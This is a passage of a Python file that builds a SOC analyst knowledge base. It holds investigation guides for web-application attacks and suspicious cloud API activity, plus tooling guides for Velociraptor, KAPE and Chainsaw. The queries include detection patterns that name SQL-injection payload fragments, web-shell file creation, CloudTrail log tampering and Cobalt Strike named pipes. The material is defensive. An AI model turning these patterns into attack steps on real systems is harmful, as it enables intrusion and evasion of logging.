| project TimeGenerated, Computer, Image, TargetFilename

// All requests from attacker IP across time
CommonSecurityLog
| where TimeGenerated > ago(24h)
| where SourceIP == "<ATTACKER_IP>"
| summarize RequestCount = count(), UniqueURIs = dcount(RequestURL),
    StatusCodes = make_set(EventOutcome) by SourceIP, DestinationHostName
```

### SPL (Splunk)

```spl
// WAF blocked attacks by source
index=waf action="blocked"
| stats count values(rule_id) as rules values(uri) as targets by src_ip
| sort -count

// SQLi patterns in web access logs
index=web_access
| where match(uri_query, "(?i)(union.*select|or\+1=1|sleep\(|benchmark\(|load_file|into\+outfile|--|%27)")
| table _time src_ip method uri uri_query status user_agent
| sort _time

// Web server child processes (RCE)
index=sysmon EventCode=1
    (ParentImage="*w3wp*" OR ParentImage="*httpd*" OR ParentImage="*nginx*"
     OR ParentImage="*apache*" OR ParentImage="*java*" OR ParentImage="*node*")
| where NOT match(Image, "(?i)(w3wp|conhost)")
| table _time Computer ParentImage Image CommandLine User

// Web shell file creation
index=sysmon EventCode=11
    (Image="*w3wp*" OR Image="*httpd*" OR Image="*nginx*"
     OR Image="*apache*" OR Image="*java*")
| where match(TargetFilename, "(?i)\.(asp|aspx|php|jsp|jspx)$")
| table _time Computer Image TargetFilename

// HTTP response size anomaly (data exfiltration via SQLi)
index=web_access
| eval resp_size=bytes_out
| where resp_size > 100000
| stats count avg(resp_size) as avg_size max(resp_size) as max_size by src_ip uri
| where max_size > 500000
| sort -max_size
```

## Enrichment Steps

1. **Payload Analysis**
   - URL-decode and analyze the full attack payload
   - Determine the attack technique and sophistication level
   - Check if the payload is from an automated scanner (sqlmap, Burp, Nikto) or manual
   - For SQLi: determine the injection type (union, blind, time-based, error-based)
   - For RCE: identify the command attempted and the target OS

2. **Success Assessment**
   - Check HTTP response codes: 200 with unexpected content = possible success
   - For SQLi: compare response sizes (large responses may indicate data extraction)
   - For RCE: check for new processes, files, or network connections on the server
   - For XSS: check if the payload is stored in the application database
   - Review application error logs for stack traces or database errors

3. **Source IP Intelligence**
   - Check IP reputation on AbuseIPDB, VirusTotal, Shodan
   - Determine if the IP is a known scanner, VPN, Tor exit node, or hosting provider
   - Check if the same IP has attacked other applications
   - Geo-locate the IP and check ASN ownership

4. **Vulnerability Assessment**
   - Identify the vulnerable application, endpoint, and parameter
   - Check CVE databases for known vulnerabilities in the application version
   - Determine if the application is behind a WAF with proper rules
   - Assess if the vulnerability is patchable or requires code fix

5. **Post-Exploitation Indicators**
   - Check for web shells dropped on the server
   - Review outbound connections from the web server
   - Check for new user accounts or privilege changes
   - Look for data access in application and database logs
   - Review file system changes on the web server

## Escalation Criteria

| Condition | Severity | Action |
|-----------|----------|--------|
| Automated scan, all blocked by WAF | Low | Block IP, monitor, close |
| Manual targeted attack, blocked | Medium | Block IP, verify WAF rules, notify app team |
| Attack partially succeeded, limited data exposed | High | Escalate, patch vulnerability, assess data impact |
| RCE achieved, web shell deployed | Critical | Escalate to IR, isolate server, incident response |
| Database data exfiltrated via SQLi | Critical | Escalate to IR, assess data breach scope |
| Stored XSS injected into production application | High | Escalate, remove payload, notify affected users |

## Documentation Template

```markdown
### Web Application Attack Investigation

**Alert ID:** [ALERT-ID]
**Date/Time:** [YYYY-MM-DD HH:MM UTC]
**Analyst:** [NAME]

**Attack Details:**
- Attack type: [ ] SQLi [ ] XSS [ ] RCE [ ] LFI/RFI [ ] SSRF [ ] Other
- Source IP: [IP_ADDRESS]
- Target application: [APP_NAME / URL]
- Target endpoint: [URI_PATH]
- Vulnerable parameter: [PARAM_NAME]
- HTTP method: [GET / POST]
- WAF action: [BLOCKED / ALLOWED / LOGGED]

**Payload:**
```
[URL-DECODED ATTACK PAYLOAD]
```

**Attack Assessment:**
- Automated or manual: [AUTOMATED (scanner) / MANUAL (targeted)]
- Tool identified: [SQLMAP / BURP / NIKTO / CUSTOM / Unknown]
- Attack duration: [START] to [END]
- Total requests: [COUNT]
- Successful exploitation: [YES / NO / UNCERTAIN]

**Impact (if exploitation succeeded):**
- Data accessed: [DESCRIPTION — tables, records, files]
- Data volume: [RECORDS / SIZE]
- Web shell deployed: [YES/NO — PATH]
- Commands executed: [LIST]
- Lateral movement: [YES/NO]

**Source IP Enrichment:**
- IP reputation: [CLEAN / MALICIOUS / SCANNER]
- Geo-location: [COUNTRY, CITY]
- ASN / Owner: [PROVIDER]
- Previously seen: [YES/NO]

**Actions Taken:**
- [ ] Blocked attacker IP at WAF/firewall
- [ ] Verified WAF rules are current
- [ ] Assessed exploitation success
- [ ] Removed web shells (if deployed)
- [ ] Notified application team of vulnerability
- [ ] Initiated emergency patching
- [ ] Reviewed database for unauthorized access
- [ ] Assessed data breach scope

**Verdict:** [True Positive / Benign Positive / False Positive]
**Escalated:** [YES/NO]
**Ticket:** [INCIDENT-ID]
```

## Response Actions Quick Reference

1. **Immediate**: Block attacker IP(s) at WAF and perimeter firewall
2. **Assess**: Determine if exploitation was successful (check response data, server state)
3. **Contain**: If RCE achieved, isolate the web server; remove web shells
4. **Patch**: Work with the application team to fix the vulnerability urgently
5. **Scope**: Check database logs for unauthorized data access, assess breach notification obligations
6. **Harden**: Review WAF rules, implement input validation, deploy runtime application self-protection (RASP)
""",
        ),
        # ---------------------------------------------------------------
        # Article 16: Suspicious Cloud API Activity
        # ---------------------------------------------------------------
        (
            "Investigating Suspicious Cloud API Activity",
            ["alert-investigation", "cloud-security", "aws", "azure", "gcp", "api-abuse"],
            r"""# Investigating Suspicious Cloud API Activity

## Alert Context

Suspicious cloud API activity alerts fire when cloud security tools detect anomalous API calls that may indicate account compromise, privilege abuse, or infrastructure manipulation. Cloud environments are API-driven, meaning all actions (creating resources, modifying configurations, accessing data) generate API call logs. Attackers who gain cloud credentials can rapidly escalate privileges, exfiltrate data, and deploy persistent infrastructure.

### Key Data Sources

| Source | Log / Index | Relevant Fields |
|--------|-------------|-----------------|
| AWS CloudTrail | Management and Data events | eventName, userIdentity, sourceIPAddress, requestParameters, errorCode |
| Azure Activity Log | Administrative operations | operationName, caller, claims, resourceId, status |
| Azure AD Audit Log | Identity operations | operationName, initiatedBy, targetResources |
| GCP Cloud Audit Logs | Admin and Data Access | methodName, principalEmail, callerIp, resourceName |
| Cloud Security Posture (CSPM) | Configuration changes | resource_type, change_type, risk_level |
| GuardDuty / Defender for Cloud / SCC | Threat detections | finding_type, severity, resource, actor |

### MITRE ATT&CK Mapping

| Technique | ID | Tactic |
|-----------|----|--------|
| Cloud Accounts | T1078.004 | Defense Evasion, Initial Access |
| Cloud Service Discovery | T1526 | Discovery |
| Cloud Infrastructure Discovery | T1580 | Discovery |
| Modify Cloud Compute Infrastructure | T1578 | Defense Evasion |
| Cloud Storage Object Discovery | T1619 | Discovery |
| Create Cloud Instance | T1578.002 | Defense Evasion |
| Steal Application Access Token | T1528 | Credential Access |

## Initial Triage Checklist

- [ ] Identify the cloud platform (AWS, Azure, GCP) and account/subscription affected
- [ ] Determine the identity making the API calls (user, role, service principal, access key)
- [ ] Check the source IP: is it from a corporate network, VPN, or unexpected location?
- [ ] Review the specific API calls: what actions were taken?
- [ ] Determine if the API calls were successful or produced errors
- [ ] Check if the identity normally makes these types of calls (behavioral baseline)
- [ ] Assess the sensitivity of the resources accessed or modified
- [ ] Look for privilege escalation, data access, or infrastructure modification patterns

## Suspicious API Call Categories

| Category | AWS Examples | Azure Examples | GCP Examples |
|----------|-------------|----------------|--------------|
| Reconnaissance | ListBuckets, DescribeInstances, GetCallerIdentity | List Resources, Get-AzSubscription | list, get, describe operations |
| Privilege Escalation | CreateAccessKey, AttachUserPolicy, AssumeRole | New-AzRoleAssignment, Grant OAuth | setIamPolicy, createServiceAccountKey |
| Persistence | CreateUser, CreateLoginProfile, PutBucketPolicy | New-AzADServicePrincipal, New-AzRoleAssignment | createServiceAccount, addMember |
| Data Access | GetObject, GetSecretValue, DescribeDBInstances | Get-AzStorageBlobContent, Get-AzKeyVaultSecret | storage.objects.get, secretmanager.access |
| Defense Evasion | StopLogging, DeleteTrail, PutEventSelectors | Remove diagnostic settings, delete logs | disableAuditLogging, deleteLog |
| Impact | TerminateInstances, DeleteBucket, PutBucketEncryption | Remove-AzVM, Remove-AzStorageAccount | delete, destroy operations |

## Pivot Queries

### KQL (Microsoft Sentinel - Azure)

```kql
// Azure Activity from suspicious IP
AzureActivity
| where TimeGenerated > ago(24h)
| where CallerIpAddress == "<SUSPICIOUS_IP>"
| project TimeGenerated, Caller, OperationNameValue, ResourceGroup,
    _ResourceId, ActivityStatusValue, CallerIpAddress
| sort by TimeGenerated asc

// Privilege escalation: role assignments
AzureActivity
| where TimeGenerated > ago(7d)
| where OperationNameValue has_any ("Microsoft.Authorization/roleAssignments/write",
    "Microsoft.Authorization/roleDefinitions/write")
| project TimeGenerated, Caller, OperationNameValue, Properties, ActivityStatusValue

// New service principals created
AuditLogs
| where TimeGenerated > ago(7d)
| where OperationName has_any ("Add service principal", "Add application",
    "Add service principal credentials")
| project TimeGenerated, OperationName, InitiatedBy, TargetResources, Result

// Resource modifications (VMs, storage, networking)
AzureActivity
| where TimeGenerated > ago(24h)
| where OperationNameValue has_any ("Microsoft.Compute/virtualMachines/write",
    "Microsoft.Storage/storageAccounts/write",
    "Microsoft.Network/networkSecurityGroups/write")
| project TimeGenerated, Caller, OperationNameValue, ResourceGroup, ActivityStatusValue

// Failed API calls (reconnaissance indicator)
AzureActivity
| where TimeGenerated > ago(24h)
| where ActivityStatusValue == "Failed"
| summarize FailCount = count(), Operations = make_set(OperationNameValue, 20)
    by Caller, CallerIpAddress
| where FailCount > 20
| sort by FailCount desc
```

### SPL (Splunk - AWS CloudTrail)

```spl
// All API calls from a suspicious source IP
index=aws sourcetype="aws:cloudtrail" sourceIPAddress="<SUSPICIOUS_IP>"
| stats count values(eventName) as api_calls values(userIdentity.arn) as identities
    by sourceIPAddress
| sort -count

// IAM privilege escalation activities
index=aws sourcetype="aws:cloudtrail"
    (eventName="CreateAccessKey" OR eventName="AttachUserPolicy"
     OR eventName="AttachRolePolicy" OR eventName="PutUserPolicy"
     OR eventName="CreateRole" OR eventName="AssumeRole"
     OR eventName="AddUserToGroup" OR eventName="CreateLoginProfile")
| table _time userIdentity.arn eventName requestParameters sourceIPAddress errorCode

// Data access: S3, Secrets Manager, RDS
index=aws sourcetype="aws:cloudtrail"
    (eventName="GetObject" OR eventName="GetSecretValue"
     OR eventName="DescribeDBInstances" OR eventName="CreateDBSnapshot")
| table _time userIdentity.arn eventName requestParameters.bucketName
    requestParameters.key sourceIPAddress

// CloudTrail tampering
index=aws sourcetype="aws:cloudtrail"
    (eventName="StopLogging" OR eventName="DeleteTrail"
     OR eventName="UpdateTrail" OR eventName="PutEventSelectors")
| table _time userIdentity.arn eventName requestParameters sourceIPAddress

// Error storm from single identity (enumeration)
index=aws sourcetype="aws:cloudtrail" errorCode="*"
| stats count dc(eventName) as unique_apis values(errorCode) as errors by userIdentity.arn
| where count > 50
| sort -count

// Unused region activity (lateral infrastructure)
index=aws sourcetype="aws:cloudtrail"
    awsRegion!="us-east-1" AND awsRegion!="us-west-2"
    eventName="RunInstances"
| table _time userIdentity.arn awsRegion requestParameters.instanceType sourceIPAddress
```

## Enrichment Steps

1. **Identity Analysis**
   - Determine the identity type: IAM user, role, service principal, root account
   - Check when the credentials were created and last rotated
   - Review the identity's permission boundaries and attached policies
   - Check if the credentials were exposed in code repositories or logs
   - For access keys: check if the key was recently created (attacker-generated)

2. **Source IP Context**
   - Geo-locate the source IP and compare to expected locations
   - Check if the IP belongs to a corporate network, VPN, or unknown source
   - Look up the IP on AbuseIPDB, Shodan, and cloud provider IP ranges
   - For assumed roles: check the original source IP in the AssumeRole event

3. **API Call Analysis**
   - Map the sequence of API calls to understand the attacker's workflow
   - Identify the attack stage: reconnaissance, escalation, persistence, data access, impact
   - Check for defensive evasion (disabling logging, modifying trails)
   - Assess whether API calls were successful or produced access denied errors

4. **Resource Impact Assessment**
   - Identify all resources created, modified, or deleted
   - Check for: new EC2 instances (cryptomining), S3 bucket policy changes (data exposure), security group modifications (network access), new IAM users/keys (persistence)
   - For data access: determine what data was read and its sensitivity

5. **Blast Radius**
   - Check if the compromised credentials have cross-account access
   - Review trust policies on assumed roles
   - Assess if the attacker moved from one cloud account to another
   - Check for infrastructure deployed in unusual regions

## Escalation Criteria

| Condition | Severity | Action |
|-----------|----------|--------|
| Legitimate admin activity from expected IP | Info | Document, close |
| Read-only reconnaissance, all calls failed | Medium | Rotate credentials, monitor |
| Successful privilege escalation (new IAM user, policy attached) | High | Escalate, revoke credentials, revert changes |
| CloudTrail/logging disabled or modified | Critical | Escalate to IR, restore logging immediately |
| Data accessed from S3, Secrets Manager, or databases | Critical | Escalate to IR, assess data breach |
| Root account used from unexpected location | Critical | Escalate to IR, assume full account compromise |
| Infrastructure deployed in unusual regions (cryptomining) | High | Escalate, terminate instances, rotate credentials |

## Documentation Template

```markdown
### Suspicious Cloud API Activity Investigation

**Alert ID:** [ALERT-ID]
**Date/Time:** [YYYY-MM-DD HH:MM UTC]
**Analyst:** [NAME]

**Cloud Environment:**
- Platform: [AWS / Azure / GCP]
- Account/Subscription: [ACCOUNT_ID / SUBSCRIPTION_ID]
- Region(s): [REGION LIST]

**Identity:**
- Identity type: [IAM User / Role / Service Principal / Root]
- Identity ARN/ID: [FULL_ARN_OR_ID]
- Credentials: [Access Key / Password / Token / Certificate]
- Credential age: [DAYS/MONTHS]
- Last rotation: [DATE]

**Source IP:** [IP_ADDRESS]
- Geo-location: [COUNTRY, CITY]
- IP owner: [PROVIDER/ASN]
- Expected source: [YES/NO]

**API Call Summary:**
| Time (UTC) | API Call | Target Resource | Result |
|------------|----------|-----------------|--------|
| [TIME] | [API_NAME] | [RESOURCE] | [SUCCESS/DENIED] |

**Attack Stage Assessment:**
- [ ] Reconnaissance (listing, describing resources)
- [ ] Privilege Escalation (creating keys, attaching policies)
- [ ] Persistence (new users, roles, service principals)
- [ ] Data Access (S3, databases, secrets)
- [ ] Defense Evasion (logging changes, security group modifications)
- [ ] Impact (resource deletion, encryption, cryptomining)

**Resources Affected:**
| Resource Type | Resource ID | Action | Impact |
|---------------|-------------|--------|--------|
| [TYPE] | [ID] | [CREATED/MODIFIED/DELETED] | [DESCRIPTION] |

**Actions Taken:**
- [ ] Rotated compromised credentials (access keys, passwords)
- [ ] Revoked active sessions
- [ ] Reverted unauthorized IAM changes
- [ ] Terminated unauthorized compute instances
- [ ] Restored logging configuration
- [ ] Assessed data access and potential breach
- [ ] Checked for cross-account impact
- [ ] Updated security group and network ACL configurations

**Verdict:** [True Positive / Benign Positive / False Positive]
**Escalated:** [YES/NO]
**Ticket:** [INCIDENT-ID]
```

## Response Actions Quick Reference

1. **Immediate**: Rotate or disable the compromised credentials (access keys, passwords, tokens)
2. **Restore**: Re-enable any logging or monitoring that was disabled
3. **Revert**: Undo unauthorized IAM changes, security group modifications, and bucket policies
4. **Terminate**: Shut down unauthorized compute instances in all regions
5. **Scope**: Check all regions, all accounts in the organization for attacker activity
6. **Harden**: Enable MFA on all accounts, implement SCPs to restrict unused regions, deploy cloud-native threat detection (GuardDuty, Defender for Cloud, SCC)
""",
        ),
    ]


def blue_team_tooling_articles():
    """Return 18 blue team tooling guide articles for SOC analyst knowledge base."""

    articles = []

    # -------------------------------------------------------------------------
    # 1. Velociraptor Deployment and Endpoint Investigation
    # -------------------------------------------------------------------------
    articles.append((
        "Velociraptor Deployment and Endpoint Investigation",
        ["tooling", "velociraptor", "endpoint", "dfir", "incident-response", "threat-hunting"],
        r"""# Velociraptor Deployment and Endpoint Investigation

## Overview

Velociraptor is an open-source endpoint visibility and digital forensics tool developed
by Rapid7. It uses a flexible query language called VQL (Velociraptor Query Language)
to collect artifacts from endpoints at scale. For SOC analysts, Velociraptor provides
the ability to perform live forensic triage, hunt across thousands of endpoints
simultaneously, and automate recurring collection tasks.

## Why It Matters

| Capability | SOC Benefit |
|---|---|
| Live endpoint query | No need to wait for scheduled scans |
| Artifact collection | Structured forensic data in minutes |
| Fleet-wide hunting | Search all endpoints for a single IOC |
| Event monitoring | Continuous detection at the endpoint |
| Offline collector | Triage air-gapped or remote systems |

**MITRE ATT&CK Relevance:** Velociraptor helps detect techniques across nearly all
tactics, but is especially strong for T1059 (Command and Scripting Interpreter),
T1053 (Scheduled Task/Job), T1547 (Boot or Logon Autostart Execution), and
T1070 (Indicator Removal).

## Installation

### Server Deployment (Linux)

```bash
# Download latest release
wget https://github.com/Velocidex/velociraptor/releases/download/v0.73/velociraptor-v0.73.0-linux-amd64
chmod +x velociraptor-v0.73.0-linux-amd64
mv velociraptor-v0.73.0-linux-amd64 /usr/local/bin/velociraptor

# Generate server config interactively
velociraptor config generate -i

# Start the server (creates frontend + GUI)
velociraptor --config server.config.yaml frontend -v
```

### Client Deployment (Windows)

```powershell
# Download the Windows MSI or executable
# Repack the client config from the server:
velociraptor --config server.config.yaml config client > client.config.yaml

# Install as a Windows service
velociraptor-v0.73.0-windows-amd64.exe --config client.config.yaml service install
```

### Docker Deployment

```yaml
# docker-compose.yml
version: "3"
services:
  velociraptor:
    image: velocidex/velociraptor:latest
    ports:
      - "8000:8000"   # GUI
      - "8001:8001"   # Frontend (client comms)
    volumes:
      - ./config:/config
      - ./data:/data
    command: frontend --config /config/server.config.yaml -v
```

## Core Usage

### VQL Basics

```sql
-- List running processes
SELECT Pid, Name, Exe, CommandLine, Username
FROM pslist()

-- Find processes with suspicious parent relationships
SELECT Pid, Name, Exe, CommandLine, ParentPid
FROM pslist()
WHERE Name =~ "powershell|cmd|wscript|cscript|mshta"

-- Search for files modified in the last 24 hours
SELECT FullPath, Size, Mtime
FROM glob(globs="C:/Users/*/AppData/**/*.exe")
WHERE Mtime > now() - 86400
```

### Key Built-in Artifacts

| Artifact | Purpose |
|---|---|
| Windows.System.Pslist | Running processes with full details |
| Windows.EventLogs.Evtx | Parse and filter Windows event logs |
| Windows.Registry.NTUser | User registry hive analysis |
| Windows.Detection.Yara.NTFS | YARA scan across NTFS volumes |
| Windows.Network.Netstat | Active network connections |
| Windows.Forensics.Prefetch | Prefetch file analysis |
| Windows.Persistence.PermanentWMI | WMI persistence detection |
| Generic.Forensic.Timeline | Super timeline generation |

### Running a Hunt

```
1. Navigate to "Hunt Manager" in the GUI
2. Click "+ New Hunt"
3. Select artifact: Windows.Detection.Yara.NTFS
4. Configure parameters:
   - YaraRule: rule cobalt { strings: $a = "beacon.dll" condition: $a }
   - SearchPath: C:\Users\
5. Set target: "All clients" or label group
6. Launch hunt
```

## Real Investigation Example

### Scenario: Detecting Cobalt Strike Beacon

```sql
-- Step 1: Hunt for beacon-like named pipes
SELECT * FROM Artifact.Windows.Detection.NamedPipes()
WHERE Name =~ "MSSE-|msagent_|postex_"

-- Step 2: Check for reflective DLL injection indicators
SELECT Pid, Name, Protection, MappingName, Size
FROM vad(pid=TARGET_PID)
WHERE Protection =~ "EXECUTE_READWRITE"
  AND MappingName = ""
  AND Size > 40000

-- Step 3: Dump suspicious memory region
SELECT upload(file=FullPath, accessor="process")
FROM vad(pid=TARGET_PID)
WHERE Protection =~ "EXECUTE_READWRITE" AND MappingName = ""

-- Step 4: Timeline the compromise
SELECT * FROM Artifact.Windows.Forensics.Prefetch()
WHERE Executable =~ "rundll32|regsvr32|mshta"
ORDER BY LastRunTimes DESC
```

### Scenario: Lateral Movement Detection

```sql
-- Hunt for PsExec service creation across the fleet
SELECT *
FROM Artifact.Windows.EventLogs.Evtx(
  EvtxGlob="C:/Windows/System32/winevt/Logs/System.evtx",
  IdRegex="7045"
)
WHERE EventData.ServiceName =~ "PSEXE|anydesk|mesh|remote"

-- Detect pass-the-hash via Event ID 4624 Type 9
SELECT *
FROM Artifact.Windows.EventLogs.Evtx(
  EvtxGlob="C:/Windows/System32/winevt/Logs/Security.evtx",
  IdRegex="4624"
)
WHERE EventData.LogonType = "9"
```

## Integration with SOC Workflow

### Automated Response with Server Event Monitoring

```yaml
# Server monitoring artifact: watch for new clients and auto-collect
name: Custom.Server.AutoTriage
type: SERVER_EVENT
sources:
  - query: |
      LET interrogations = SELECT * FROM watch_monitoring(
        artifact="Server.Internal.Interrogation")
      SELECT collect_client(
        client_id=ClientId,
        artifacts=["Windows.System.Pslist",
                    "Windows.Network.Netstat",
                    "Windows.Forensics.Prefetch"]
      ) FROM interrogations
```

### Exporting to SIEM

```bash
# Forward Velociraptor results to Elasticsearch
velociraptor --config server.config.yaml query \
  "SELECT * FROM hunt_results(hunt_id='H.1234')" --format=json \
  | curl -X POST "http://127.0.0.1:9200/velociraptor-results/_bulk" \
    -H "Content-Type: application/x-ndjson" --data-binary @-
```

### Offline Collector for Remote Sites

```bash
# Build a standalone collector executable
velociraptor --config server.config.yaml artifacts collect \
  --output collector.zip \
  Windows.KapeFiles.Targets \
  --args "Device=C:" \
  --args "VSSAnalysis=Y" \
  --format=csv
```

## Best Practices

1. **Label your endpoints** by department, OS, or criticality for targeted hunts
2. **Schedule recurring artifacts** for baseline collection (weekly prefetch, daily netstat)
3. **Use server-side notebooks** to build reusable analysis queries
4. **Rate-limit hunts** on large fleets to avoid network saturation (Ops/sec setting)
5. **Integrate with TheHive** by exporting hunt results as case observables

## Further Reading

- Velociraptor documentation: https://docs.velociraptor.app/
- VQL reference: https://docs.velociraptor.app/vql_reference/
- Velociraptor artifact exchange: https://docs.velociraptor.app/exchange/
"""
    ))

    # -------------------------------------------------------------------------
    # 2. KAPE Triage Collection and Analysis
    # -------------------------------------------------------------------------
    articles.append((
        "KAPE Triage Collection and Analysis",
        ["tooling", "kape", "dfir", "triage", "forensics", "windows"],
        r"""# KAPE Triage Collection and Analysis

## Overview

KAPE (Kroll Artifact Parser and Extractor) is a triage collection and processing
tool designed for rapid forensic artifact acquisition. Developed by Eric Zimmerman,
KAPE uses modular Targets (what to collect) and Modules (how to process) to
automate the gathering and parsing of forensic evidence from Windows systems.

## Why It Matters

| Capability | SOC Benefit |
|---|---|
| Rapid triage | Collect key artifacts in minutes, not hours |
| Modular targets | Consistent collection across incidents |
| Built-in parsing | Automatic processing with EZ tools |
| VSS support | Access Volume Shadow Copies for deleted data |
| Portable | Runs from USB, no installation needed |

**MITRE ATT&CK Relevance:** KAPE is essential for investigating T1547 (Boot/Logon
Autostart), T1053 (Scheduled Tasks), T1059 (Command Interpreters), T1070 (Indicator
Removal), T1003 (OS Credential Dumping) post-incident.

## Installation

```powershell
# Download from https://www.kroll.com/en/services/cyber-risk/incident-response-litigation-support/kape-download
# Extract to a folder (e.g., C:\Tools\KAPE)
# Update targets and modules:
C:\Tools\KAPE\gkape.exe  # GUI launcher

# Or use the command line updater
C:\Tools\KAPE\kape.exe --update
```

### Directory Structure

```
KAPE/
  kape.exe          # CLI executable
  gkape.exe         # GUI wrapper
  Targets/          # Collection definitions (.tkape)
  Modules/          # Processing definitions (.mkape)
  Documentation/    # Reference docs
```

## Core Usage

### Target Collection (What to Grab)

```powershell
# Collect common triage artifacts from C: drive
kape.exe --tsource C: --tdest C:\Evidence\Collection --target KapeTriage --vss

# Collect specific targets
kape.exe --tsource C: --tdest C:\Evidence\Collection ^
  --target RegistryHives,EventLogs,Prefetch,AmCache,SRUM ^
  --vss --debug

# Collect browser artifacts only
kape.exe --tsource C: --tdest C:\Evidence\Browser ^
  --target WebBrowsers
```

### Key Targets

| Target Name | What It Collects |
|---|---|
| KapeTriage | Comprehensive triage (registry, logs, prefetch, etc.) |
| RegistryHives | SAM, SYSTEM, SOFTWARE, NTUSER.DAT, UsrClass.dat |
| EventLogs | All .evtx files from Windows event log directory |
| Prefetch | Prefetch files showing program execution |
| $MFT | Master File Table for file system timeline |
| SRUM | System Resource Usage Monitor database |
| AmCache | Application compatibility cache |
| WebBrowsers | Chrome, Firefox, Edge history/downloads/cache |
| LnkFilesAndJumpLists | Recent file access artifacts |
| PowerShellConsole | PowerShell ConsoleHost_history.txt files |
| ScheduledTasks | Task XML files from Windows\System32\Tasks |

### Module Processing (How to Parse)

```powershell
# Process collected artifacts with EZ tools
kape.exe --msource C:\Evidence\Collection --mdest C:\Evidence\Parsed ^
  --module !EZParser

# Run specific modules
kape.exe --msource C:\Evidence\Collection --mdest C:\Evidence\Parsed ^
  --module EvtxECmd,PECmd,AmcacheParser,RECmd_AllRegExecutablesFoundOrRun

# Combine collection and processing in one pass
kape.exe --tsource C: --tdest C:\Evidence\Collection ^
  --target KapeTriage --vss ^
  --mdest C:\Evidence\Parsed --module !EZParser
```

### Key Modules

| Module | Parser | Output |
|---|---|---|
| EvtxECmd | Event log parser | CSV of parsed events |
| PECmd | Prefetch parser | CSV with execution times |
| AmcacheParser | Amcache parser | CSV of executed programs |
| RECmd_AllRegExecutablesFoundOrRun | Registry parser | CSV of run keys, services |
| MFTECmd | MFT parser | CSV timeline of file activity |
| SrumECmd | SRUM parser | CSV of resource usage |
| LECmd | LNK file parser | CSV of file access |
| JLECmd | Jump list parser | CSV of recent items |

## Real Investigation Example

### Scenario: Ransomware Triage

```powershell
# Step 1: Rapid collection from affected system
kape.exe --tsource C: --tdest E:\Case001\Collection ^
  --target KapeTriage,RegistryHives,EventLogs,$MFT,SRUM ^
  --vss --debug

# Step 2: Process all artifacts
kape.exe --msource E:\Case001\Collection --mdest E:\Case001\Parsed ^
  --module !EZParser

# Step 3: Examine parsed results
# Check Prefetch for ransomware executable
Import-Csv E:\Case001\Parsed\PECmd\*.csv |
  Where-Object { $_.ExecutableName -match "ransom|crypt|lock" } |
  Sort-Object LastRun -Descending |
  Format-Table ExecutableName, RunCount, LastRun
```

### Scenario: Insider Threat - Data Exfiltration

```powershell
# Collect USB and file access artifacts
kape.exe --tsource C: --tdest E:\Case002\Collection ^
  --target USBDevicesLogs,LnkFilesAndJumpLists,WebBrowsers,CloudStorage ^
  --vss

# Process and examine
kape.exe --msource E:\Case002\Collection --mdest E:\Case002\Parsed ^
  --module LECmd,JLECmd,SBECmd

# Analyze LNK files for accessed network shares
Import-Csv E:\Case002\Parsed\LECmd\*.csv |
  Where-Object { $_.LocalPath -match "\\\\|removable|usb" } |
  Sort-Object SourceCreated -Descending
```

## Creating Custom Targets

```yaml
# Save as Targets/Custom/CompanyTriage.tkape
Description: Custom company triage collection
Author: SOC Team
Version: 1.0
Id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
RecreateDirectories: true
Targets:
  -
    Name: Custom Startup Items
    Category: Persistence
    Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\
    Recursive: true
    FileMask: "*"
  -
    Name: Custom Scheduled Tasks
    Category: Persistence
    Path: C:\Windows\System32\Tasks\
    Recursive: true
    FileMask: "*"
  -
    Name: WMI Repository
    Category: Persistence
    Path: C:\Windows\System32\wbem\Repository\
    FileMask: "OBJECTS.DATA"
```

## Integration with SOC Workflow

### Remote Collection via Network Share

```powershell
# Mount admin share and collect remotely
net use \\TARGET\C$ /user:DOMAIN\admin
kape.exe --tsource \\TARGET\C$ --tdest E:\RemoteTriage\TARGET ^
  --target KapeTriage
```

### Automated Triage Script

```powershell
# deploy_kape_triage.ps1
param([string[]]$Targets)
$KapePath = "\\FileServer\Tools\KAPE\kape.exe"
$EvidenceShare = "\\FileServer\Evidence"

foreach ($target in $Targets) {
    $destPath = Join-Path $EvidenceShare "$target-$(Get-Date -Format yyyyMMdd)"
    Start-Job -ScriptBlock {
        & $using:KapePath --tsource "\\$using:target\C$" `
          --tdest $using:destPath --target KapeTriage --vss
    }
}
Get-Job | Wait-Job | Receive-Job
```

### Timeline Generation

```powershell
# After KAPE collection, build a super timeline
kape.exe --msource E:\Case001\Collection --mdest E:\Case001\Timeline ^
  --module MFTECmd,EvtxECmd,PECmd,LECmd,JLECmd,AmcacheParser,SrumECmd

# Merge CSVs into a single timeline with TimelineExplorer
# Or import into your SIEM for correlation
```

## Best Practices

1. **Always use --vss** to capture Volume Shadow Copy data (may reveal deleted files)
2. **Update targets/modules regularly** with `kape.exe --update`
3. **Hash your collections** using `--sha1` or `--sha256` for chain of custody
4. **Document your command lines** in case notes for reproducibility
5. **Test custom targets** on a clean system before deploying in production
6. **Store KAPE on a write-blocked USB** for field triage operations

## Further Reading

- KAPE documentation: https://ericzimmerman.github.io/KapeDocs/
- Target/Module repository: https://github.com/EricZimmerman/KapeFiles
- SANS KAPE cheat sheet: https://www.sans.org/posters/kape-quick-reference-guide/
"""
    ))

    # -------------------------------------------------------------------------
    # 3. Chainsaw for Rapid Windows Event Log Analysis
    # -------------------------------------------------------------------------
    articles.append((
        "Chainsaw for Rapid Windows Event Log Analysis",
        ["tooling", "chainsaw", "windows", "event-logs", "sigma", "threat-hunting", "dfir"],
        r"""# Chainsaw for Rapid Windows Event Log Analysis

## Overview

Chainsaw is a command-line tool developed by WithSecure (formerly F-Secure) that
enables rapid searching and analysis of Windows Event Logs (.evtx files). It supports
Sigma rules out of the box, allowing SOC analysts to apply community detection logic
directly against collected log files without needing a full SIEM deployment.

## Why It Matters

| Capability | SOC Benefit |
|---|---|
| Sigma rule scanning | Apply thousands of detection rules offline |
| Fast search | Regex and keyword search across .evtx files |
| Timeline output | Chronological view of detected events |
| Lightweight | Single binary, no installation needed |
| Offline analysis | Works on collected evidence, no live access needed |

**MITRE ATT&CK Relevance:** Chainsaw can detect virtually any technique that
generates Windows event log entries, including T1059 (Command Interpreters),
T1053 (Scheduled Tasks), T1543 (Create or Modify System Process), T1136
(Create Account), T1098 (Account Manipulation).

## Installation

```bash
# Download from GitHub releases
# https://github.com/WithSecureLabs/chainsaw/releases

# Linux
wget https://github.com/WithSecureLabs/chainsaw/releases/latest/download/chainsaw_x86_64-unknown-linux-gnu.tar.gz
tar xzf chainsaw_x86_64-unknown-linux-gnu.tar.gz

# Windows (PowerShell)
